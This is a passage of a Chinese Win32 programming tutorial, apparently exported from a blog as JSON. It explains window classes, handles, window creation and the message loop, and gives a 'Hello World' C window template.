y</code>：指定窗口左上角位置，单位是像素（px）。即窗口的位置。</li>\n<li><code>nWidth、nHeight</code>：窗口的宽度和高度，也就是窗口的大小，同样是以像素为单位的。</li>\n</ul>\n<p>CreateWindowEx 建立窗口以后，eax 中传回来的是窗口句柄，注意要把它先保存起来，因为这时候，窗口虽已建立，但还没有在屏幕上显示出来。</p>\n<p>4.显示窗口：</p>\n<blockquote>\n<p><code>ShowWindow</code>用于显示上一步创建的窗口，该函数有两个参数，第一个参数是要显示的窗口的句柄，第二个参数是显示的方式，显示的方式是众多预定义的值，具体定义查文档。</p>\n</blockquote>\n<p>5.绘制窗口：</p>\n<blockquote>\n<p>窗口显示以后，用 <code>UpdateWindow</code> 绘制客户区，它实际上就是向窗口发送了一条 <code>WM_PAINT</code> 消息。到此为止，一个顶层窗口才算正常建立并显示！ </p>\n</blockquote>\n<p>绘制窗口，传入要绘制的窗口的句柄：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke UpdateWindow,hxxxx</span><br></pre></td></tr></table></figure>\n<p>6.消息循环：</p>\n<p>消息循环中的几个函数要用到一个MSG结构，用来做消息传递：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MSG STRUCT  </span><br><span class=\"line\"></span><br><span class=\"line\">Hwnd      DWORD     ?   ;消息要发向的窗口的句柄。</span><br><span class=\"line\">Message   DWORD     ?   ;消息标识符，在头文件中以WM_开头的预定义值。</span><br><span class=\"line\">WParam    DWORD     ?   ;消息的参数之一。</span><br><span class=\"line\">LParam    DWORD     ?   ;消息的参数之二。</span><br><span class=\"line\">Time      DWORD     ?   ;消息放入消息队列的时间。</span><br><span class=\"line\">Pt        POINT     &lt;&gt;  ;这是一个POINT数据结构，表示消息放入消息队列时的鼠标坐标。</span><br><span class=\"line\"></span><br><span class=\"line\">MSG ENDS</span><br></pre></td></tr></table></figure>\n<p>获取消息：</p>\n<blockquote>\n<p><code>GetMessage</code> 函数从消息队列里取得消息，用取得的消息填写到传入的MSG结构。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke  GetMessage, lpMsg, hWnd, wMsgFilterMin,wMsgFilterMax ;</span><br></pre></td></tr></table></figure>\n<p>参数解析：</p>\n<ul>\n<li>lpMsg：指向一个MSG结构，函数取到的消息填写MSG后返回。</li>\n<li>hWnd：传入要获取消息的的窗口句柄。指定为NULL表示获取所有本程序的窗口的消息。</li>\n<li>wMsgFilterMin 和wMsgFilterMax 为0表示获取所有编号的消息。</li>\n</ul>\n<p><code>TranslateMessage</code>的作用是遇到键盘消息则将扫描码转换成ASCII码并在消息队列中插入<code>WM_CHAR</code> 或<code>WM_SYSCHAR</code>消息，参数就是转换好的ASCII码。   </p>\n<p>最后，由 <code>DispatchMessage</code> 将消息（<code>GetMessage</code>填写好的MSG结构）发送到窗口对应的窗口过程去处理。</p>\n<p>窗口过程返回后 <code>DispatchMessage</code> 函数才返回，然后开始新一轮消息循环。</p>\n<h4 id=\"0x04-Win窗口程序编写模板\"><a href=\"#0x04-Win窗口程序编写模板\" class=\"headerlink\" title=\"0x04 Win窗口程序编写模板\"></a>0x04 Win窗口程序编写模板</h4><p>该模板是用C调用API函数编写的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">LRESULT CALLBACK <span class=\"title\">WindowProc</span><span class=\"params\">(HWND hwhd,UINT,WPARAM wParam,LPARAM IParam)</span></span>;   <span class=\"comment\">//回调函数（过程函数）原型。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> WINAPI <span class=\"title\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,HINSTANCE hPreInstance,PSTR szCmdline,<span class=\"keyword\">int</span> iCmdShow )</span>   <span class=\"comment\">//WinMain函数由系统调用。</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">     \\* ------------------------注册窗口类---------------------------------*\\</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">static</span> TCHAR szAppName[] = TEXT(<span class=\"string\">\"MyWindows\"</span>);     <span class=\"comment\">//声明并初始化一个字符串，用作注册的窗口类的名称</span></span><br><span class=\"line\">     </span><br><span class=\"line\">     WNDCLASS wndclass;                          <span class=\"comment\">//以WNDCLASS结构为模板，声明一个结构名为wndclass的结构。</span></span><br><span class=\"line\">     wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class=\"line\">     wndclass.lpfnWndProc = WindowProc;          <span class=\"comment\">//指明回调函数名称（函数名本质是地址，因此是指针）。</span></span><br><span class=\"line\">     wndclass.cbClsExtra = <span class=\"number\">0</span>;</span><br><span class=\"line\">     wndclass.cbWndExtra = <span class=\"number\">0</span>;</span><br><span class=\"line\">     wndclass.hInstance = hInstance;             <span class=\"comment\">//程序当前实例的句柄，由WinMain函数传入。</span></span><br><span class=\"line\">     wndclass.hIcon = LoadIcon(<span class=\"literal\">NULL</span>, IDI_APPLICATION);              <span class=\"comment\">//图标</span></span><br><span class=\"line\">     wndclass.hCursor = LoadCursor(<span class=\"literal\">NULL</span>, IDC_ARROW);                <span class=\"comment\">//光标</span></span><br><span class=\"line\">     wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);  <span class=\"comment\">//窗口背景色</span></span><br><span class=\"line\">     wndclass.lpszMenuName = <span class=\"literal\">NULL</span>;                                  <span class=\"comment\">//窗口菜单</span></span><br><span class=\"line\">     wndclass.lpszClassName = szAppName;     <span class=\"comment\">//注册的窗口类的字符串名称。（要求指针，因此是字符串的地址）</span></span><br><span class=\"line\"></span><br><span class=\"line\">     RegisterClass(&amp;wndclass);     <span class=\"comment\">//注册窗口类，类的信息定义在WNDCLASS结构中。传入结构的地址作为参数。</span></span><br><span class=\"line\"></span><br><span class=\"line\">     </span><br><span class=\"line\">     \\* ------------------------创建窗口---------------------------------*\\</span><br><span class=\"line\"></span><br><span class=\"line\">     HWND hwnd;     <span class=\"comment\">//声明一个句柄结构类型的变量。(通常声明于WinMain函数内部顶部，此处为了方便观看)</span></span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">//根据窗口类创建窗口，并返回窗口的句柄。</span></span><br><span class=\"line\">     hwnd = CreateWindow( szAppName,                  <span class=\"comment\">//上一步中注册的类的名称（字符串地址）。</span></span><br><span class=\"line\">                         TEXT(<span class=\"string\">\"MyWindow\"</span>),           <span class=\"comment\">//窗口的标题（字符串地址）。</span></span><br><span class=\"line\">                         WS_OVERLAPPEDWINDOW,</span><br><span class=\"line\">                         CW_USEDEFAULT,</span><br><span class=\"line\">                         CW_USEDEFAULT,</span><br><span class=\"line\">                         CW_USEDEFAULT,</span><br><span class=\"line\">                         CW_USEDEFAULT,</span><br><span class=\"line\">                         <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">                         <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">                         hInstance,                  <span class=\"comment\">//程序当前实例的句柄，由WinMain函数传入。</span></span><br><span class=\"line\">                         <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">     \\* ------------------------显示、绘制窗口---------------------------------*/</span><br><span class=\"line\"></span><br><span class=\"line\">     ShowWindow(hwnd,iCmdShow);      <span class=\"comment\">//传入要显示的窗口的句柄。</span></span><br><span class=\"line\">     UpdateWindow(hwnd);             <span class=\"comment\">//传入要绘制的窗口句柄，实际上就是向窗口发送了一条 WM_PAINT 消息。</span></span><br><span class=\"line\"></span><br><span class=\"line\">     \\* ------------------------消息处理---------------------------------*/</span><br><span class=\"line\"></span><br><span class=\"line\">     MSG msg;        <span class=\"comment\">//一个MSG结构为类型，声明一个结构名为msg的结构。</span></span><br><span class=\"line\">     </span><br><span class=\"line\">     <span class=\"keyword\">while</span>(GetMessage(&amp;msg,<span class=\"literal\">NULL</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>))    <span class=\"comment\">//传入的时msg结构的地址，因此三个函数操作的都是同一的对象。</span></span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">         TranslateMessage(&amp;msg);</span><br><span class=\"line\">         DispatchMessage(&amp;msg);          <span class=\"comment\">//将消息分发给回调函数WindowProc**</span></span><br><span class=\"line\"></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> msg.wParam;  <span class=\"comment\">//当接收到一个WM_QUIT消息时，程序就中止。并且返回传递给WM_QUIT消息的wParam参数的值。</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">LRESULT CALLBACK <span class=\"title\">WindowProc</span><span class=\"params\">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span>  <span class=\"comment\">//回调函数定义</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    HDC hdc;</span><br><span class=\"line\">    PAINTSTRUCT ps;</span><br><span class=\"line\">    RECT rect;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (message)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">       <span class=\"keyword\">case</span> WM_PAINT:</span><br><span class=\"line\">           hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class=\"line\">           GetClientRect(hwnd, &amp;rect);</span><br><span class=\"line\">           DrawText(hdc, TEXT(<span class=\"string\">\"Hello World!\"</span>), <span class=\"number\">-1</span>, &amp;rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class=\"line\">           EndPaint(hwnd, &amp;ps);</span><br><span class=\"line\">           <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">       <span class=\"keyword\">case</span> WM_DESTROY:</span><br><span class=\"line\">           PostQuitMessage(<span class=\"number\">0</span>);</span><br><span class=\"line\">           <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> DefWindowProc(hwnd, message, wParam, lParam); <span class=\"comment\">//若消息没有匹配到上面，默认执行该操作。</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h4 id=\"0x00-程序与窗口的关系\"><a href=\"#0x00-程序与窗口的关系\" class=\"headerlink\" title=\"0x00 程序与窗口的关系\"></a>0x00 程序与窗口的关系</h4><p>一个窗口不一定就是一个程序，它可能只是程序的一部分，一个程序可以有多个顶层窗口，一个顶层窗口又可以有多个子窗口，子窗口又可以有子窗口。</p>\n<p>程序也不一定是窗口，如果一个程序不需要与用户进行交互，那么他可以不建立窗口。</p>\n<p>DOS程序是过程驱动的。窗口程序是事件驱动的。</p>","more":"<p><img src=\"/2019/04/02/06-win32编程基础Chapter-6/Image.png\" alt></p>\n<h4 id=\"0x01-消息队列\"><a href=\"#0x01-消息队列\" class=\"headerlink\" title=\"0x01 消息队列\"></a>0x01 消息队列</h4><p>Windows在系统内部有一个系统队列，当输入设备有所动作（键盘输入、鼠标移动/点击等），Winodws会产生相应的记录并放到系统消息队列中。同时，Windows还会为每个窗口程序（严格说是每个线程）维护一个消息队列。</p>\n<p><img src=\"/2019/04/02/06-win32编程基础Chapter-6/Image [2].png\" alt></p>\n<h4 id=\"0x02-模块与句柄\"><a href=\"#0x02-模块与句柄\" class=\"headerlink\" title=\"0x02 模块与句柄\"></a>0x02 模块与句柄</h4><p>模块：</p>\n<blockquote>\n<p>一个运行中的.exe或dll就是一个模块，包括代码和所有资源。即在硬盘上的文件不能称为模块，加载到内存后才能称为模块。dll被不同程序加载到内存就产生了不同模块，以隔离地址空间。</p>\n</blockquote>\n<p>句柄：</p>\n<blockquote>\n<p>为了能够区分不同模块，因此产生了句柄用来唯一标识每个模块。句柄只是一个数值，它对程序是没意义的，它只是Windows用来区分不同资源的编号，以便Window能够区分和使用。</p>\n</blockquote>\n<p>简单来说：</p>\n<blockquote>\n<p>Windows为每个窗口、dll等都各分配一个句柄，并记录窗口、dll等与句柄的对应关系。</p>\n<p>Windows将句柄给程序，程序操作句柄等同于操作窗口。</p>\n<p>Windows也可以通过我们传入的句柄知道程序要操作的窗口。</p>\n<p>Windows上几乎所有东西都用句柄标识：文件句柄、窗口句柄、模块句柄、线程句柄等。</p>\n</blockquote>\n<p>获取句柄：</p>\n<blockquote>\n<p>在Win32中，模块句柄数值上等于程序装入内存的起始地址。</p>\n</blockquote>\n<p>可以用API函数GetModuleHandle获取模块的句柄：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke GetModuleHandle,lpModuleName  ;lpModuleName参数是指向模块名称字符串地址的指针。</span><br></pre></td></tr></table></figure>\n<p>PS：如果lpModuleName参数使用NULL，返回得到的是调用者自身的本模块句柄。为了便利会先把程序的句柄获取并放在全局变量保存。</p>\n<p>API函数返回值即模块的句柄，存储在EAX中。 </p>\n<h4 id=\"0x03-窗口程序\"><a href=\"#0x03-窗口程序\" class=\"headerlink\" title=\"0x03 窗口程序\"></a>0x03 窗口程序</h4><p>1.一个程序的结构流程：</p>\n<blockquote>\n<p>得到应用程序的句柄（GetModuleHandle）</p>\n<p>注册窗口类(RegisterClassEx) </p>\n<p>建立窗口（CreateWindowEx） </p>\n<p>显示窗口（ShowWindows） </p>\n<p>刷新窗口客户区（UpdateWindow） </p>\n<p>进入无限的消息获取和处理的循环：</p>\n<ul>\n<li>获得消息（GetMessage）</li>\n<li>消息处理（TranslateMessage ）</li>\n<li>分派消息（DispatchMessage）</li>\n</ul>\n</blockquote>\n<p>2.注册窗口类：</p>\n<blockquote>\n<p>建立窗口类的方法是在系统中注册，注册窗口类的API函数是 <code>RegisterClassEx</code>，最后的“Ex”是扩展的意思，因为它是 Win16 中<code>RegisterClass</code>的扩展。</p>\n</blockquote>\n<p>一个窗口类定义了窗口的一些主要属性，如：图标、光标、背景色、菜单和负责处理所属该窗口消息的函数。这些属性并不是分成多个参数传递过去的（这种做法不聪明），而是定义在一个<code>WNDCLASSEX</code>结构中，再把结构的地址当参数一次性传递给 <code>RegisterClassEx</code>。</p>\n<p>WNDCLASSEX结构定义：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WNDCLASSEX STRUCT </span><br><span class=\"line\"></span><br><span class=\"line\">CbSize         DWORD   ?  ;结构的字节数</span><br><span class=\"line\">Style          DWORD   ?  ;类风格  </span><br><span class=\"line\">LpfnWndProc    DWORD   ?  **;窗口过程的地址,****回调函数的地址。**</span><br><span class=\"line\">CbClsExtra     DWORD   ?  </span><br><span class=\"line\">CbWndExtra     DWORD   ?  </span><br><span class=\"line\">HInstance      DWORD   ?  ;**指定窗口类属于的模块，传入模块的句柄。**  </span><br><span class=\"line\">HIcon          DWORD   ?  ;窗口左上角的图标  </span><br><span class=\"line\">HCursor        DWORD   ?  ;窗口光标  </span><br><span class=\"line\">HbrBackground  DWORD   ?  ;窗口客户区的背景色  </span><br><span class=\"line\">LpszMenuName   DWORD   ?  ;窗口菜单  </span><br><span class=\"line\">LpszClassName  DWORD   ?  **;要注册的类的字符串名字，指向类名字符串地址的指针。**  </span><br><span class=\"line\">HIconSm        DWORD   ?  ;小图标 </span><br><span class=\"line\"></span><br><span class=\"line\">WNDCLASSEX ENDS</span><br></pre></td></tr></table></figure>\n<ul>\n<li>LpfnWndProc</li>\n</ul>\n<blockquote>\n<p>基于这个类创建的窗口都使用该回调函数，即一个窗口过程可以服务多个窗口，只要它们是由同一个窗口类创建的。</p>\n<p>Windows运行到DispatchMessage函数时，会把消息传给该过程函数。</p>\n</blockquote>\n<p>注册窗口类：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local   stWndClass:WNDCLASSEX             ;以WNDCLASSEX结构为类型定义一个结构。</span><br><span class=\"line\">invoke  RegisterClassEx,addr stWndClass   ;调用注册函数进行窗口类注册</span><br></pre></td></tr></table></figure>\n<p>3.建立窗口：</p>\n<blockquote>\n<p>利用上一步注册的窗口类为基础（模板）来创建一个窗口。</p>\n</blockquote>\n<p>和注册窗口类时用一个结构传递所有参数不同，建立窗口时所有的属性都是用单个参数的方式传递的，建立窗口的API函数是<code>CreateWindowEx</code>。  </p>\n<p>建立窗口：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke   CreateWindowEx, dwExStyle, lpClassName,lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance,lpParam</span><br></pre></td></tr></table></figure>\n<p>参数解析：</p>\n<ul>\n<li><code>lpClassName</code>：传入上一步注册的类的字符串名称。表示使用该类为模板创建窗口，会继承窗口类的属性以及使用窗口类指定的窗口过程。 </li>\n<li><code>lpWindowName</code>：窗口的标题。指向窗口标题字符串地址的指针。 </li>\n<li><code>hInstance</code>：窗口所属的模块的句柄。</li>\n<li><code>dwExStyle、dwStyle</code>：窗口的两个参数 dwStyle 和 dwExStyle 决定了窗口的外形和行为，们是一些以WS（Windows Style的缩写）为开头的预定义值，具体查文档。</li>\n<li><code>x, y</code>：指定窗口左上角位置，单位是像素（px）。即窗口的位置。</li>\n<li><code>nWidth、nHeight</code>：窗口的宽度和高度，也就是窗口的大小，同样是以像素为单位的。</li>\n</ul>\n<p>CreateWindowEx 建立窗口以后，eax 中传回来的是窗口句柄，注意要把它先保存起来，因为这时候，窗口虽已建立，但还没有在屏幕上显示出来。</p>\n<p>4.显示窗口：</p>\n<blockquote>\n<p><code>ShowWindow</code>用于显示上一步创建的窗口，该函数有两个参数，第一个参数是要显示的窗口的句柄，第二个参数是显示的方式，显示的方式是众多预定义的值，具体定义查文档。</p>\n</blockquote>\n<p>5.绘制窗口：</p>\n<blockquote>\n<p>窗口显示以后，用 <code>UpdateWindow</code> 绘制客户区，它实际上就是向窗口发送了一条 <code>WM_PAINT</code> 消息。到此为止，一个顶层窗口才算正常建立并显示！ </p>\n</blockquote>\n<p>绘制窗口，传入要绘制的窗口的句柄：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke UpdateWindow,hxxxx</span><br></pre></td></tr></table></figure>\n<p>6.消息循环：</p>\n<p>消息循环中的几个函数要用到一个MSG结构，用来做消息传递：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MSG STRUCT  </span><br><span class=\"line\"></span><br><span class=\"line\">Hwnd      DWORD     ?   ;消息要发向的窗口的句柄。</span><br><span class=\"line\">Message   DWORD     ?   ;消息标识符，在头文件中以WM_开头的预定义值。</span><br><span class=\"line\">WParam    DWORD     ?   ;消息的参数之一。</span><br><span class=\"line\">LParam    DWORD     ?   ;消息的参数之二。</span><br><span class=\"line\">Time      DWORD     ?   ;消息放入消息队列的时间。</span><br><span class=\"line\">Pt        POINT     &lt;&gt;  ;这是一个POINT数据结构，表示消息放入消息队列时的鼠标坐标。</span><br><span class=\"line\"></span><br><span class=\"line\">MSG ENDS</span><br></pre></td></tr></table></figure>\n<p>获取消息：</p>\n<blockquote>\n<p><code>GetMessage</code> 函数从消息队列里取得消息，用取得的消息填写到传入的MSG结构。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke  GetMessage, lpMsg, hWnd, wMsgFilterMin,wMsgFilterMax ;</span><br></pre></td></tr></table></figure>\n<p>参数解析：</p>\n<ul>\n<li>lpMsg：指向一个MSG结构，函数取到的消息填写MSG后返回。</li>\n<li>hWnd：传入要获取消息的的窗口句柄。指定为NULL表示获取所有本程序的窗口的消息。</li>\n<li>wMsgFilterMin 和wMsgFilterMax 为0表示获取所有编号的消息。</li>\n</ul>\n<p><code>TranslateMessage</code>的作用是遇到键盘消息则将扫描码转换成ASCII码并在消息队列中插入<code>WM_CHAR</code> 或<code>WM_SYSCHAR</code>消息，参数就是转换好的ASCII码。   </p>\n<p>最后，由 <code>DispatchMessage</code> 将消息（<code>GetMessage</code>填写好的MSG结构）发送到窗口对应的窗口过程去处理。</p>\n<p>窗口过程返回后 <code>DispatchMessage</code> 函数才返回，然后开始新一轮消息循环。</p>\n<h4 id=\"0x04-Win窗口程序编写模板\"><a href=\"#0x04-Win窗口程序编写模板\" class=\"headerlink\" title=\"0x04 Win窗口程序编写模板\"></a>0x04 Win窗口程序编写模板</h4><p>该模板是用C调用API函数编写的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">LRESULT CALLBACK <span class=\"title\">WindowProc</span><span class=\"params\">(HWND hwhd,UINT,WPARAM wParam,LPARAM IParam)</span></span>;   <span class=\"comment\">//回调函数（过程函数）原型。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> WINAPI <span class=\"title\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,HINSTANCE hPreInstance,PSTR szCmdline,<span class=\"keyword\">int</span> iCmdShow )</span>   <span class=\"comment\">//WinMain函数由系统调用。</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">     \\* ------------------------注册窗口类---------------------------------*\\</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">static</span> TCHAR szAppName[] = TEXT(<span class=\"string\">\"MyWindows\"</span>);     <span class=\"comment\">//声明并初始化一个字符串，用作注册的窗口类的名称</span></span><br><span class=\"line\">     </span><br><span class=\"line\">     WNDCLASS wndclass;                          <span class=\"comment\">//以WNDCLASS结构为模板，声明一个结构名为wndclass的结构。</span></span><br><span class=\"line\">     wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class=\"line\">     wndclass.lpfnWndProc = WindowProc;          <span class=\"comment\">//指明回调函数名称（函数名本质是地址，因此是指针）。</span></span><br><span class=\"line\">     wndclass.cbClsExtra = <span class=\"number\">0</span>;</span><br><span class=\"line\">     wndclass.cbWndExtra = <span class=\"number\">0</span>;</span><br><span class=\"line\">     wndclass.hInstance = hInstance;             <span class=\"comment\">//程序当前实例的句柄，由WinMain函数传入。</span></span><br><span class=\"line\">     wndclass.hIcon = LoadIcon(<span class=\"literal\">NULL</span>, IDI_APPLICATION);              <span class=\"comment\">//图标</span></span><br><span class=\"line\">     wndclass.hCursor = 